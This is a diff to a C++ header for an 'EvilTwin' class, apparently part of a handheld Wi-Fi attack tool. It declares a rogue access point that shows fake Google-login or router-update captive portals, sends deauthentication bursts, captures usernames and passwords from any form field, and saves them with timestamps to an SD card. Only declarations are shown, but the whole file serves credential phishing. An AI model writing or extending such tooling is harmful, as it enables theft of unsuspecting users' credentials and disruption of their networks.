@@ -12,12 +12,14 @@
 #define ET_LOG_PATH       "/apps/eviltwin/creds.csv"
 #define ET_PORTAL_DIR     "/apps/eviltwin/portal"
 #define ET_PER_PAGE       8
-#define ET_MAX_CREDS      20
+#define ET_TEMPLATE_MAX   64
+#define ET_MAX_CREDS      30
 #define ET_CREDS_PER_PAGE 5
 
 struct CapturedCred {
     char user[48];
     char pass[48];
+    char ts[24];      // capture timestamp (empty if no clock); preserved on flush
 };
 
 class EvilTwin {
@@ -35,7 +37,8 @@ private:
     // portal state
     char  _ssid[33];
     int   _tmpl;          // 0=Google login  1=Router update
-    int           _captureCount;
+    int           _captureCount;   // total POSTs seen (may exceed ET_MAX_CREDS)
+    int           _savedCount;     // how many creds already flushed to SD
     char          _lastUser[48];
     char          _lastPass[48];
     CapturedCred  _creds[ET_MAX_CREDS];
@@ -59,25 +62,34 @@ private:
     char  _sdTemplatePath[96];
     char  _sdTemplateName[32];
 
+    // transient on-screen notice (portal/template changes, fallbacks)
+    uint32_t _uiNoticeMs;
+    char     _uiNoticeText[40];
+    uint16_t _uiNoticeColor;
+
     // -- setup UI --
     int  showModeMenu();
     bool doScanAndPick();
     void drawScanList(int total, int page);
     bool promptCustomSSID();
     bool askDeauth();
-    bool pickSdTemplate();
+    bool pickTemplate();
 
     // -- portal handlers --
     void setupRoutes();
     void handleRoot();
-    void handlePost();
+    void handleCapture();   // field-agnostic cred grab + redirect (any path/verb)
+    bool captureArgs();     // scan all form args, store creds if any; true if found
     void handleRedirect();
 
     // -- runtime --
     void drawScreen();
     void sendDeauthBurst();
     void showCredsTable();
-    void saveCredsToSD();
+    // Append creds not yet saved to SD; returns count newly written.
+    // wifiSafe=true means WiFi is already torn down / promiscuous off (exit path).
+    // wifiSafe=false pauses promiscuous around the write (mid-session [s]).
+    int  flushCredsToSD(bool wifiSafe);
 };
 
 #endif // EVILTWIN_H
